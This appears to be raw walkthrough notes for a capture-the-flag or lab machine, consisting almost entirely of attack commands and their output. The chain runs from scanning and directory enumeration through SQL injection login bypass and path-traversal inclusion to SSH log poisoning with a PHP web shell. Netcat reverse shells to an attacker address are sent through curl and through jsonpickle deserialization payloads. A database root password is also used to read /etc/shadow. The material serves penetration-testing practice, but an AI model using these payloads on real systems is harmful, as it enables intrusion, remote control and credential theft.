```console

$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.50
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-17 14:14 CEST
Nmap scan report for 192.168.110.50
Host is up (0.00080s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f (RSA)
|   256 be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 (ECDSA)
|_  256 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:F9:ED:3D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.80 ms 192.168.110.50

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds

```

└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.110.50  -t 20 -x php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.110.50
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2021/09/17 14:22:02 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 314] [--> http://192.168.110.50/css/]
/manual               (Status: 301) [Size: 317] [--> http://192.168.110.50/manual/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.110.50/js/]    
/javascript           (Status: 301) [Size: 321] [--> http://192.168.110.50/javascript/]
/robots.txt           (Status: 403) [Size: 299]                                        
/sea.php              (Status: 302) [Size: 0] [--> atlantis.php]                       
/atlantis.php         (Status: 200) [Size: 1718]                                       
/server-status        (Status: 403) [Size: 302]                                        
/gods                 (Status: 301) [Size: 315] [--> http://192.168.110.50/gods/]      
                                                                                       
===============================================================
2021/09/17 14:23:41 Finished
===============================================================


```console


└─$ wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/SQL.txt -d "username=FUZZ&password=password"  --hc 200 http://192.168.110.50/atlantis.php
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.110.50/atlantis.php
Total requests: 125

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000039:   302        43 L     84 W       1718 Ch     "' or 1=1 or ''='"
000000029:   302        43 L     84 W       1718 Ch     "' or 0=0 #"
000000121:   302        43 L     84 W       1718 Ch     "x' or 1=1 or 'x'='y"
000000119:   302        43 L     84 W       1718 Ch     "' or 1=1 or ''='"

```

```console

' or 1=1 -- -

http://192.168.110.50/gods/

[ ] hades.log
[ ] poseidon.log
[ ] zeus.log

http://192.168.110.50/sea.php?file=../gods/hades
http://192.168.110.50/sea.php?file=../../../../var/www/html/gods/hades
http://192.168.110.50/sea.php?file=../../../../var/log/auth

└─$ ssh '<?php echo "oscp"; ?>'@192.168.110.50         
└─$ ssh '<?php system($_GET["cmd"]); ?>'@192.168.110.50

http://192.168.110.50/sea.php?file=../../../../var/log/auth&cmd=id


```




```bash
# <input type="text" id="username" class="form-control" name="username" required autofocus>
# <input type="password" id="password" class="form-control" name="password" required>

curl -s -c cookie --data-urlencode "username=' or 1=1 -- -" --data-urlencode "password=password" http://192.168.110.50/atlantis.php
curl -s -b cookie http://192.168.110.50/sea.php?file=hades
curl -s -b cookie http://192.168.110.50/sea.php?file=../../../../var/www/html/gods/hades
curl -s -b cookie http://192.168.110.50/sea.php?file=../../../../var/log/auth
curl -G -s -b cookie --data-urlencode "file=../../../../var/log/auth" --data-urlencode "cmd=nc 192.168.110.1 80 -e /bin/sh" http://192.168.110.50/sea.php

```




```console
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
poseidon:x:1000:1000:,,,:/home/poseidon:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false

```

```php
#cat atlantis.php
<?php
   define('DB_USERNAME', 'root');
   define('DB_PASSWORD', 'yVzyRGw3cG2Uyt2r');
   $db = new PDO("mysql:host=localhost:3306;dbname=db", DB_USERNAME,DB_PASSWORD);

   session_start();

   if($_SERVER["REQUEST_METHOD"] == "POST") {
   $username = $_POST["username"];
   $pwd = hash('sha256',$_POST["password"]);
   //if (!$db) die ($error);
   $statement = $db->prepare("Select * from users where username='".$username."' and pwd='".$pwd."'");
   $statement->execute();
   $results = $statement->fetch(PDO::FETCH_ASSOC);
   if (isset($results["pwd"])){
       $_SESSION['logged_in'] = $username;
       header("Location: sea.php");
   } else {
        $_SESSION["logged_in"] = false;
        sleep(2); // Don't brute force :(
        echo "<br /><center>Incorrect login</center>";
   } }
?>
```

```console
mysql -uroot -pyVzyRGw3cG2Uyt2r -hlocalhost -e "use db; show tables;"
mysql -uroot -pyVzyRGw3cG2Uyt2r -hlocalhost -e "use db; select * from users;"
mysql -uroot -pyVzyRGw3cG2Uyt2r -hlocalhost -e "select load_file('/etc/passwd');"
mysql -uroot -pyVzyRGw3cG2Uyt2r -hlocalhost -e "select load_file('/etc/shadow');"
mysql -uroot -pyVzyRGw3cG2Uyt2r -hlocalhost -e "select load_file('/root/flag.txt');"
mysql -uroot -pyVzyRGw3cG2Uyt2r -hlocalhost -e "select load_file('/root/flags.txt');" 2>&1
mysql -uroot -pyVzyRGw3cG2Uyt2r -hlocalhost -e "select @@version;"
mysql -uroot -pyVzyRGw3cG2Uyt2r -hlocalhost -e "select @@user;" 2>&1
```

```console

ps -aux | grep python
root       384  0.0  1.4  23504 14444 ?        Ss   08:23   0:01 /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app
root       527  0.0  1.6  28060 17084 ?        S    08:23   0:00 /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app
root       528  0.0  1.6  27584 16760 ?        S    08:23   0:00 /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app
root       531  0.0  1.6  27924 17008 ?        S    08:23   0:00 /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app
www-data  2308  0.0  0.0   3236   616 ?        S    09:40   0:00 grep python
```

```console

ssh -N -f -R 8080:127.0.0.1:8080 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.110.1 -i key

```

```console

{"py/object": "app.User", "username": [{"py/reduce": [{"py/function": "os.system"},["nc 192.168.110.1 1234 -e /bin/sh"],0,0,0]}]}

{"py/object": "app.User", "username": [{"py/reduce": [{"py/type": "subprocess.call"}, {"py/tuple": ["/bin/ls"]}, null, null, null]}]}
{"py/object": "app.User", "username": [{"py/reduce": [{"py/type": "subprocess.call"}, {"py/tuple": ["/bin/ls11"]}, null, null, null]}]}
{"py/object": "app.User", "username": [{"py/reduce": [{"py/type": "subprocess.call"}, {"py/tuple": ["whereis nc"]}, null, null, null]}]}
{"py/object": "app.User", "username": [{"py/reduce": [{"py/type": "subprocess.call"}, {"py/tuple": ["nc 192.168.110.1 1234 -e /bin/sh"]}, null, null, null]}]}
{"py/object": "app.User", "username": [{"py/reduce": [{"py/type": "subprocess.call"}, {"py/tuple": ["/tmp/shell.sh"]}, null, null, null]}]}

{"py/object": "app.User", "username": [{"py/reduce": [{"py/type": "subprocess.call"}, {"py/tuple": ["./shell.sh"]}, null, null, null]}]}

{"py/object": "app.User", "username": [{"py/reduce": [{"py/type": "subprocess.call"}, {"py/tuple": ["./shell.sh"]}, null, null, null]}]}

{"py/object": "app.User", "username": [{"py/reduce":[{"py/type": "subprocess.Popen"}, ["ls"], null, null, null]}]}

{"py/object": "app.User", "username": [{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["/bin/ls"]}]}]}]}
{"py/object": "app.User", "username": [{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["nc 192.168.110.1 1234 -e /bin/sh"]}]}]}]}

```

